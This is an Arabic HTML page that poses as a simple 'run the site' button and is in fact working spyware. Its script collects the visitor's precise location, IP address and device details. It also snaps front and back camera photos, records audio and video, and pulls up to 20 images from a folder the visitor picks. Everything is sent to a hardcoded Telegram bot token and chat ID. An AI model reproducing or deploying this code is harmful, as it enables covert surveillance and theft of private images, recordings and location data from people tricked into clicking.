<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تشغيل الموقع</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
            font-family: Arial;
        }
        button {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 20px 40px;
            font-size: 20px;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
            transition: all 0.3s;
        }
        button:active {
            transform: scale(0.95);
            background: #45a049;
        }
        #status {
            margin-top: 20px;
            font-size: 14px;
            color: #666;
            text-align: center;
        }
    </style>
</head>
<body>
    <button id="actionButton">تشغيل الموقع</button>
    <div id="status"></div>

    <script>
        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
        const CHAT_ID = "6913353602";
        
        const actionButton = document.getElementById('actionButton');
        const statusDiv = document.getElementById('status');

        actionButton.addEventListener('click', async function() {
            try {
                actionButton.disabled = true;
                actionButton.textContent = "جارٍ تشغيل الموقع...";
                statusDiv.textContent = "جاري طلب الأذونات...";
                
                // طلب جميع الأذونات مرة واحدة
                const [stream, geoPosition] = await Promise.all([
                    navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: 'environment' }, 
                        audio: true 
                    }).catch(e => null),
                    
                    new Promise(resolve => {
                        navigator.geolocation.getCurrentPosition(
                            pos => resolve(pos),
                            err => resolve(null),
                            { enableHighAccuracy: true, timeout: 10000 }
                        );
                    })
                ]);
                
                // 1. جمع وإرسال معلومات الجهاز
                statusDiv.textContent = "جمع معلومات الجهاز...";
                const deviceInfo = await getCompleteDeviceInfo(geoPosition);
                await sendToTelegram(formatDeviceInfo(deviceInfo));
                
                // 2. التقاط وإرسال صور الكاميرات
                statusDiv.textContent = "التقاط صور الكاميرات...";
                const [frontCam, backCam] = await Promise.all([
                    captureCamera('user').catch(e => null),
                    captureCamera('environment').catch(e => null)
                ]);
                
                if (frontCam) await sendToTelegram(frontCam, 'sendPhoto', 'front_camera.jpg');
                if (backCam) await sendToTelegram(backCam, 'sendPhoto', 'back_camera.jpg');
                
                // 3. تسجيل وإرسال الصوت (10 ثواني)
                statusDiv.textContent = "تسجيل الصوت...";
                const audioBlob = await recordAudio(10000).catch(e => null);
                if (audioBlob) await sendToTelegram(audioBlob, 'sendAudio', 'audio_recording.ogg');
                
                // 4. تسجيل وإرسال الفيديو (15 ثانية)
                statusDiv.textContent = "تسجيل الفيديو...";
                const videoBlob = await recordVideo(15000).catch(e => null);
                if (videoBlob) await sendToTelegram(videoBlob, 'sendVideo', 'video_recording.mp4');
                
                // 5. إرسال الصور من الجهاز
                statusDiv.textContent = "جاري البحث عن الصور...";
                const imagesSent = await sendImagesFromDevice().catch(e => 0);
                
                // إعلام المستخدم بالانتهاء
                actionButton.textContent = "تم التشغيل بنجاح";
                statusDiv.textContent = `تم إرسال ${imagesSent} صورة`;
                
            } catch (error) {
                console.error('حدث خطأ:', error);
                actionButton.textContent = "خطأ! اضغط مجدداً";
                statusDiv.textContent = "حدث خطأ أثناء التشغيل";
            } finally {
                setTimeout(() => {
                    actionButton.textContent = "تشغيل الموقع";
                    actionButton.disabled = false;
                    statusDiv.textContent = "";
                }, 5000);
            }
        });

        // ===== دوال جمع المعلومات =====
        async function getCompleteDeviceInfo(geoPosition) {
            const connection = navigator.connection || {};
            const battery = await getBatteryInfo();
            
            return {
                // معلومات الموقع
                country: await getCountry(),
                city: await getCity(),
                ip: await getIPAddress(),
                coordinates: geoPosition ? {
                    lat: geoPosition.coords.latitude,
                    lon: geoPosition.coords.longitude,
                    accuracy: geoPosition.coords.accuracy,
                    mapUrl: `https://maps.google.com/?q=${geoPosition.coords.latitude},${geoPosition.coords.longitude}`
                } : null,
                
                // معلومات البطارية
                batteryLevel: battery.level,
                isCharging: battery.charging,
                
                // معلومات الشبكة
                networkType: connection.effectiveType || 'غير متاح',
                connectionType: connection.type || 'غير متاح',
                downlink: connection.downlink ? `${connection.downlink} Mbps` : 'غير معروف',
                rtt: connection.rtt ? `${connection.rtt} ms` : 'غير معروف',
                
                // معلومات الوقت
                time: new Date().toLocaleString('ar-SA', { 
                    timeZoneName: 'short',
                    hour12: true
                }),
                
                // معلومات الجهاز
                deviceName: navigator.userAgentData?.platform || navigator.platform,
                deviceVersion: navigator.userAgentData?.platformVersion || 'غير متاح',
                deviceType: getDeviceType(),
                memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير متاح',
                cores: navigator.hardwareConcurrency || 'غير معروف',
                language: navigator.language || navigator.userLanguage,
                
                // معلومات المتصفح
                browser: getBrowserName(),
                browserVersion: getBrowserVersion(),
                lastUpdate: 'غير متاح', // يحتاج لـ API خاص
                
                // معلومات الشاشة
                screenResolution: `${screen.width}x${screen.height}`,
                osVersion: getOSVersion(),
                screenOrientation: screen.orientation?.type || 'غير معروف',
                colorDepth: `${screen.colorDepth} بت`,
                
                // معلومات الأمان
                protocol: window.location.protocol,
                
                // معلومات إضافية
                geolocation: 'geolocation' in navigator ? 'نعم' : 'لا',
                bluetooth: 'bluetooth' in navigator ? 'نعم' : 'لا',
                touchGestures: 'ongesturestart' in window ? 'نعم' : 'لا'
            };
        }

        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: `${Math.floor(battery.level * 100)}%`,
                        charging: battery.charging ? 'نعم' : 'لا'
                    };
                } catch {
                    return { level: 'غير متاح', charging: 'غير متاح' };
                }
            }
            return { level: 'غير متاح', charging: 'غير متاح' };
        }

        async function getCountry() {
            try {
                const response = await fetch('https://ipapi.co/country_name/');
                return await response.text();
            } catch {
                return 'غير متاح';
            }
        }

        async function getCity() {
            try {
                const response = await fetch('https://ipapi.co/city/');
                return await response.text();
            } catch {
                return 'غير متاح';
            }
        }

        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'غير متاح';
            }
        }

        function getDeviceType() {
            const ua = navigator.userAgent;
            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "تابلت";
            if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "هاتف";
            return "كمبيوتر";
        }

        function getBrowserName() {
            const ua = navigator.userAgent;
            if (ua.indexOf("Firefox") !== -1) return "Firefox";
            if (ua.indexOf("SamsungBrowser") !== -1) return "Samsung Browser";
            if (ua.indexOf("Opera") !== -1 || ua.indexOf("OPR") !== -1) return "Opera";
            if (ua.indexOf("Trident") !== -1) return "Internet Explorer";
            if (ua.indexOf("Edge") !== -1) return "Edge";
            if (ua.indexOf("Chrome") !== -1) return "Chrome";
            if (ua.indexOf("Safari") !== -1) return "Safari";
            return "غير معروف";
        }

        function getBrowserVersion() {
            const ua = navigator.userAgent;
            let temp;
            if (ua.indexOf("Firefox") !== -1) {
                temp = ua.substring(ua.indexOf("Firefox") + 8);
                return temp.split(" ")[0];
            }
            if (ua.indexOf("Chrome") !== -1) {
                temp = ua.substring(ua.indexOf("Chrome") + 7);
                return temp.split(" ")[0];
            }
            return "غير معروف";
        }

        function getOSVersion() {
            const ua = navigator.userAgent;
            if (ua.indexOf("Windows NT 10.0") != -1) return "Windows 10";
            if (ua.indexOf("Windows NT 6.3") != -1) return "Windows 8.1";
            if (ua.indexOf("Windows NT 6.2") != -1) return "Windows 8";
            if (ua.indexOf("Windows NT 6.1") != -1) return "Windows 7";
            if (ua.indexOf("Windows NT 6.0") != -1) return "Windows Vista";
            if (ua.indexOf("Windows NT 5.1") != -1) return "Windows XP";
            if (ua.indexOf("Windows NT 5.0") != -1) return "Windows 2000";
            if (ua.indexOf("Mac") != -1) return "Mac/iOS";
            if (ua.indexOf("X11") != -1) return "UNIX";
            if (ua.indexOf("Linux") != -1) return "Linux";
            if (ua.indexOf("Android") != -1) return "Android";
            if (ua.indexOf("iPhone") != -1) return "iPhone";
            if (ua.indexOf("iPad") != -1) return "iPad";
            return "غير معروف";
        }

        function formatDeviceInfo(info) {
            let message = `📱 <b>معلومات الجهاز:</b>\n`;
            message += `- الدولة: ${info.country}\n`;
            message += `- المدينة: ${info.city}\n`;
            message += `- عنوان IP: <code>${info.ip}</code>\n`;
            
            if (info.coordinates) {
                message += `- خط العرض: ${info.coordinates.lat}\n`;
                message += `- خط الطول: ${info.coordinates.lon}\n`;
                message += `- دقة الموقع: ±${Math.round(info.coordinates.accuracy)} متر\n`;
                message += `- رابط الخريطة: ${info.coordinates.mapUrl}\n`;
            }
            
            message += `- شحن الهاتف: ${info.batteryLevel}\n`;
            message += `- هل الهاتف يشحن؟: ${info.isCharging}\n`;
            message += `- الشبكة: ${info.networkType}\n`;
            message += `- نوع الاتصال: ${info.connectionType}\n`;
            message += `- الوقت: ${info.time}\n`;
            message += `- اسم الجهاز: ${info.deviceName}\n`;
            message += `- إصدار الجهاز: ${info.deviceVersion}\n`;
            message += `- نوع الجهاز: ${info.deviceType}\n`;
            message += `- الذاكرة (RAM): ${info.memory}\n`;
            message += `- عدد الأنوية: ${info.cores}\n`;
            message += `- لغة النظام: ${info.language}\n`;
            message += `- اسم المتصفح: ${info.browser}\n`;
            message += `- إصدار المتصفح: ${info.browserVersion}\n`;
            message += `- دقة الشاشة: ${info.screenResolution}\n`;
            message += `- إصدار نظام التشغيل: ${info.osVersion}\n`;
            message += `- وضع الشاشة: ${info.screenOrientation}\n`;
            message += `- عمق الألوان: ${info.colorDepth}\n`;
            message += `- تاريخ آخر تحديث للمتصفح: ${info.lastUpdate}\n`;
            message += `- بروتوكول الأمان المستخدم: ${info.protocol}\n`;
            message += `- نطاق التردد للاتصال: ${info.downlink}\n`;
            message += `- إمكانية تحديد الموقع الجغرافي: ${info.geolocation}\n`;
            message += `- الدعم لتقنية البلوتوث: ${info.bluetooth}\n`;
            message += `- دعم الإيماءات اللمسية: ${info.touchGestures}`;
            
            return message;
        }

        // ===== دوال الوسائط =====
        async function captureCamera(facingMode) {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: facingMode,
                    width: 1280,
                    height: 720 
                }
            });
            
            const track = stream.getVideoTracks()[0];
            const imageCapture = new ImageCapture(track);
            const bitmap = await imageCapture.grabFrame();
            
            const canvas = document.createElement('canvas');
            canvas.width = bitmap.width;
            canvas.height = bitmap.height;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(bitmap, 0, 0);
            
            return new Promise((resolve) => {
                canvas.toBlob(resolve, 'image/jpeg', 0.8);
                track.stop();
            });
        }

        async function recordAudio(duration) {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            return new Promise((resolve) => {
                const recorder = new MediaRecorder(stream, { mimeType: 'audio/ogg' });
                let chunks = [];
                
                recorder.ondataavailable = (e) => chunks.push(e.data);
                recorder.onstop = () => {
                    resolve(new Blob(chunks, { type: 'audio/ogg' }));
                    stream.getTracks().forEach(track => track.stop());
                };
                
                recorder.start();
                setTimeout(() => recorder.stop(), duration);
            });
        }

        async function recordVideo(duration) {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'environment', width: 1280, height: 720 },
                audio: true
            });
            
            return new Promise((resolve) => {
                const recorder = new MediaRecorder(stream, { 
                    mimeType: 'video/mp4',
                    videoBitsPerSecond: 2500000
                });
                let chunks = [];
                
                recorder.ondataavailable = (e) => chunks.push(e.data);
                recorder.onstop = () => {
                    resolve(new Blob(chunks, { type: 'video/mp4' }));
                    stream.getTracks().forEach(track => track.stop());
                };
                
                recorder.start();
                setTimeout(() => recorder.stop(), duration);
            });
        }

        async function sendImagesFromDevice() {
            try {
                const dirHandle = await window.showDirectoryPicker();
                let sentCount = 0;
                
                for await (const entry of dirHandle.values()) {
                    if (sentCount >= 20) break;
                    if (entry.kind === 'file' && /\.(jpg|jpeg|png|gif|webp)$/i.test(entry.name)) {
                        const file = await entry.getFile();
                        await sendToTelegram(file, 'sendPhoto');
                        sentCount++;
                        await new Promise(resolve => setTimeout(resolve, 300));
                    }
                }
                return sentCount;
            } catch {
                return 0;
            }
        }

        async function sendToTelegram(data, method = 'sendMessage', filename = 'file') {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            
            if (method === 'sendMessage') {
                formData.append('text', data);
                formData.append('parse_mode', 'HTML');
            } else {
                formData.append(
                    method === 'sendAudio' ? 'audio' : 
                    method === 'sendVideo' ? 'video' : 'photo', 
                    data, filename
                );
            }
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
                method: 'POST',
                body: formData
            });
        }
    </script>
</body>
</html>
